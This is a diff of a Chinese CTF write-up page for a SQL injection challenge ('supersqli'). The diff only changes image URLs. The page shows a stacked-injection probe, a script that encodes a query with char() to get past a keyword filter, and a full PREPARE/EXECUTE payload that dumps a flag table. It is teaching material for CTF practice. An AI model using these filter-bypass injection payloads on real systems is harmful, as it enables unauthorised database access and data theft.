@@ -114,7 +114,7 @@
 <pre><code class="php">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
 <p>明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者说无法使用联合查询之类的。尝试可以知道可以使用堆叠注入。</p>
 <pre><code class="mysql">1&#39;;show tables;#</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190904/15676107961704.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png" alt="img"></p>
 <p>但是由于过滤了select可以使用<code>concat()</code>将字符合成字符串而字符使用<code>char()</code>将ASCII转换为字符，即可bypass过滤，然后使用预处理执行目标语句。</p>
 <h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="mysql">payload=&quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
 exp = &quot;select group_concat(flag) from supersqli.1919810931114514&quot;
@@ -124,7 +124,7 @@ for i in exp:
 
 print(payload%(result[:-1]))#result[:-1]除去换行符</code></pre>
 <h2 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h2><pre><code class="mysql">0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(102),char(108),char(97),char(103),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(115),char(117),char(112),char(101),char(114),char(115),char(113),char(108),char(105),char(46),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52));PREPARE a FROM @s;EXECUTE a;</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190905/15676946962230.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute20190905/15676946962230.png" alt="img"></p>
 <h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><p><a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
 <h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="mysql批处理"><a href="#mysql批处理" class="headerlink" title="mysql批处理"></a>mysql批处理</h2><pre><code class="csharp">设置变量：set @s=sql语句
 预处理语句：prepare 预处理名字 from ‘sql语句’
